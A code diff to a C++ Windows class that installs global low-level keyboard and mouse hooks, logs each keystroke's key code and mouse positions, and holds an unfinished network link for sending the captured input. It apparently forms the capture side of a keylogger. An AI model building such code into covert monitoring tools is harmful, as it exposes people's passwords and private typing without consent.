@@ -1,6 +1,8 @@
 #include "Hooker.hh"
 
 Hooker::Hooker() {
+	_previousPoint.x = 0;
+	_previousPoint.y = 0;
 	isConnected() = connect();
 	initializeHooks();
 }
@@ -24,8 +26,7 @@ void Hooker::runHookLoop()
 	}
 }
 
-bool Hooker::initializeHooks()
-{
+bool Hooker::initializeHooks() {
 	_kHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
 	if (!_kHook) {
 		std::cerr << "SetWindowHookEx error : " << GetLastError() << std::endl;
@@ -39,20 +40,29 @@ bool Hooker::initializeHooks()
 	return true;
 }
 
-void Hooker::deInitializeHooks()
-{
+void Hooker::deInitializeHooks() {
 	UnhookWindowsHookEx(_kHook);
 	UnhookWindowsHookEx(_mHook);
 }
 
-void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMouse)
-{
+void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMouse) {
 	if (isConnected())
 		connect();
 	if (isMouse) {
 		MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
-		std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
-		//_packager.addKey(nCode, wParam, lParam);	// MOUSEINPUT
+		if (wParam == WM_MOUSEMOVE) {
+			if (((std::abs(std::abs(mouseStruct->pt.x) - std::abs(_previousPoint.x)) >= 100) ||					// Prevents mouse move spam
+				std::abs(std::abs(mouseStruct->pt.y) - std::abs(_previousPoint.y)) >= 100)) {
+				_previousPoint.x = mouseStruct->pt.x;
+				_previousPoint.y = mouseStruct->pt.y;
+				std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
+				//_packager.addKey(nCode, wParam, lParam);	// MOUSEINPUT
+			}
+		}
+		else {
+			std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
+			//_packager.addKey(nCode, wParam, lParam);	// MOUSEINPUT
+		}
 	}
 	else {
 		std::cout << "KB INPUT " << nCode << "  " << wParam << "  " << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
@@ -64,26 +74,28 @@ bool Hooker::connect() {
 	return false;
 }
 
-bool& Hooker::isConnected()
-{
+bool& Hooker::isConnected() {
 	return _connected;
 }
 
-Network& Hooker::getNetwork()
-{return *_network;}
+void Hooker::setNetwork(Network* network) {
+	_network = network;
+}
+
+Network& Hooker::getNetwork() const {
+	return *_network;
+}
 
 
 
-LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
-{
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	Hooker& hooker = Hooker::getInstance();
 	if (nCode >= 0)
 		hooker.receiveCallback(nCode, wParam, lParam);
 	return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
-LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
-{
+LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	Hooker& hooker = Hooker::getInstance();
 	if (nCode >= 0)
 		hooker.receiveCallback(nCode, wParam, lParam, true);
